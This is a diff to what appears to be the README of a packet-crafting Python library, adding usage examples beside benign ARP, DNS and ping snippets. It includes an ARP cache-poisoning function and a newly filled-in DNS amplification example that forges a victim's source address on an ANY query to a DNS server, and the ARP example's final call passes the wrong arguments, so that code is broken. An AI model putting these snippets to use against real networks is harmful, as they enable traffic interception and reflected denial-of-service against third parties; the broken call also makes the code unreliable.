@@ -52,6 +52,21 @@ pkt = Ether()/ARP(pdst=ip)  # Everything is auto-completed :)
 ans = sendreceive(pkt)
 print(f"{ip}'s MAC address is {ans.hwsrc}")
 ```
+
+#### ARP Spoofing/Cache Poisoning
+```python
+from All import *
+
+def poison(target_ip, target_mac, fake_ip, fake_mac, count=50):
+    pkt = Ether(src=fake_mac)/ARP(hwsrc=fake_mac, psrc=fake_ip, hwdst=target_mac, pdst=target_ip, opcode=2)
+    for _ in range(count):
+        send(pkt)
+
+poison(pkt, count=50)
+
+```
+
+
 #### DNS Queries
 (No support for Additional and Authorative RRs)
 ```python
@@ -62,7 +77,18 @@ pkt = Ether()/IP(dst="8.8.8.8")/UDP(dport=53)/DNS(qd=DNSQR(qname="google.com"))
 ans = sendreceive(pkt, timeout=3)
 
 for answer_record in ans.an:
-	print(answer_record.rdata)
+    print(answer_record.rdata)
+```
+
+#### DNS Amplification
+```python
+from All import *
+
+def dns_amp(target_ip):
+    pkt = Ether()/IP(src=target_ip, dst="ip.of.dns.server")/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="google.com", qtype=255))
+    send(pkt)
+
+dns_amp("192.168.1.2")
 ```
 
 #### Resolve Hostname in LAN
@@ -81,7 +107,7 @@ pkt = Ether()/IP(dst="224.0.0.251")/UDP(dport=5353)/DNS(qd=DNSQR(qname="myHostna
 ans = sendreceive(pkt, flipIP=False)  
   
 for answer_record in ans.an:  
-  print(answer_record.rdata)
+    print(answer_record.rdata)
 ```
 
 #### Ping an IP
@@ -92,25 +118,6 @@ from All import *
 pkt = Ether()/IP(dst="8.8.8.8")/ICMP()
 res = sendreceive(pkt, timeout=2)
 print(res)
-```
-
-#### ARP Spoofing/Cache Poisoning
-```python
-from All import *
-
-def poison(target_ip, target_mac, fake_ip, fake_mac, count=50):
-    pkt = Ether(src=fake_mac)/ARP(hwsrc=fake_mac, psrc=fake_ip, hwdst=target_mac, pdst=target_ip, opcode=2)
-    for _ in range(count):
-        send(pkt)
-
-poison(pkt, count=50)
-
-```
-
-#### DNS Amplification
-```python
-from All import *
-# Example TBC
 ```
     
 
